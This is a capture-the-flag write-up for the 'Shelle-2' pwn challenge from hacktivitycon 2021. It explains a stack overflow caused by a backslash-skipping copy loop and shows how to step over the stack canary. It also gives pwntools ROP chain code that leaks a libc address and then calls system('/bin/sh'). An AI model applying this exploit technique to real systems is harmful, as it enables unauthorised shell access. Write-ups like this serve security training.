# Shelle-2 - hacktivitycon 2021

- Category: Pwn
- Points: 493
- Solves: 27
- Solved by: drw0if

## Description

Professor Shelle was mad that everyone bypassed her psuedo shell and read the flag, Now she removed the vulnerability and thinks that the new strict-psuedo shell is secure.. hah, time to prove her wrong.

## Solution

We have to deal with a `wannabe-shell`, it asks us for a command and... doesn't execute it because everything is removed for security reasons.

The vulnerable part of the code is inside the `run_cmds` function, of course:
```C
    ...
    string_offset = 56;
    ...
    input_index = 0;
    ...
    getline(&input_line, &n, stdin);
    ...
    string_index = string_offset;
    while ( string_index <= 499 )
    {
      if ( input_line[input_index] == 92 )
      {
        ++input_index;
      }
      else
      {
        if ( input_line[input_index] )
          s[input_index - 1 + string_offset] = input_line[input_index];
        ++input_index;
        ++string_index;
      }
    }
```

If we supply a lot of `\` characters (92 ASCII) we can move `input_index` as far as we want, then we can provide our payload and let the loop copy it inside the stack buffer `s`.

The binary has the following protections:
```bash
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
so everything we can do is ROP attack and we have to deal with the canary, but we have no PIE so no leak is needed for the binary addresses.

The stack canary can be defeated simply by skipping it with enough `\` characters and writing just after it.

We have another problem: it doesn't copy all the characters, infact if we supply `\x00` it will be skipped in the check:
```
        if ( input_line[input_index] )
          s[input_index - 1 + string_offset] = input_line[input_index];
```

So if the stack has some bytes where we need to put a zero byte our ropchain won't work.

Luckily we have enough stack and input space to place our chain in pieces and use some `pop stuff` gadget to pad the different pieces.

Since we want to pop us a shell we need to leak a libc address, the correct libc can be found in two different ways:
- we can extract it from the docker container provided with the challenge
- we can leak two addresses and use [libc database](https://libc.blukat.me/) to identify the correct one

In the end we can use the classic ropchain:
```python
# leak puts@got
payload += p64(pop_rdi)
payload += p64(exe.got.puts)
payload += p64(puts)

# second stage
payload += p64(exe.sym.run_cmds)

# system("/bin/sh")
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.sym.system)
```

but with all the stack cleanup stuff it becomes:
```python
payload += p64(pop_5)
payload += p64(5)
payload += p64(4)
payload += p64(3)
payload += p64(2)
payload += p64(1)

payload += p64(pop_4)
payload += p64(4)
payload += p64(3)
payload += p64(2)
payload += p64(1)

payload += p64(pop_3)
payload += p64(3)
payload += p64(2)
payload += p64(1)

# leak puts@got
payload += p64(pop_rdi)
payload += p64(exe.got.puts)
payload += p64(puts)

payload += p64(pop_3)
payload += p64(3)
payload += p64(2)
payload += p64(1)

# second stage
payload += p64(exe.sym.run_cmds)

payload += p64(pop_2)
payload += p64(2)
payload += p64(1)

payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh')))

payload += p64(pop_2)
payload += p64(2)
payload += p64(1)

payload += p64(libc.sym.system)
```